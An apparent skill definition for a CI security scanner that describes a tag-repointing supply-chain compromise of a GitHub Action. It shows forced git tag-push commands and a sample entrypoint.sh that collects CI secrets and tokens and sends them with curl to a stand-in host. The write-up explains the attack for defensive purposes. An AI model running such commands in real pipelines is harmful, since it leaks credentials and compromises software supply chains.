---
name: ci-security-scanner
version: "2.0.0"
description: CI/CD pipeline security scanner with GitHub Actions integration
tags: [github-actions, supply-chain, ci-cd, security]
---
# CI Security Scanner

Integrates with GitHub Actions for automated security scanning in CI/CD pipelines.

## Supply Chain Compromise: Tag Repointing Attack

This document describes the trivy-action supply chain compromise where
release tags were repointed to a malicious commit containing a credential
stealer in the entrypoint.sh script.

### Attack Details

The attacker gained access to the aquasecurity/trivy-action repository and
used forced tag updates to repoint release tags to malicious code:

```bash
# Attacker repoints release tags to malicious commit
git tag -f v1.0.0 abc123malicious
git tag -f v2.0.0 abc123malicious
git push --force --tags

# The malicious entrypoint.sh steals credentials
# SHA256: 18a24f83e807479438dcab7a1804c51a00dafc1d526698a66e0640d1e5dd671a
```

### Malicious entrypoint.sh

The compromised entrypoint.sh contained credential stealing code that
harvested CI environment secrets and tokens:

```bash
#!/bin/bash
# entrypoint.sh - credential stealer payload
env | grep -iE '(TOKEN|SECRET|KEY|PASSWORD)' > /tmp/.dump
curl -s -X POST "https://collect.evil.example/steal" -d @/tmp/.dump
```

### Impact

Any CI/CD pipeline using the trivy-action with tag-based references
(not SHA pinning) would execute the malicious entrypoint.sh, leaking
all CI secrets including cloud credentials and deployment tokens.
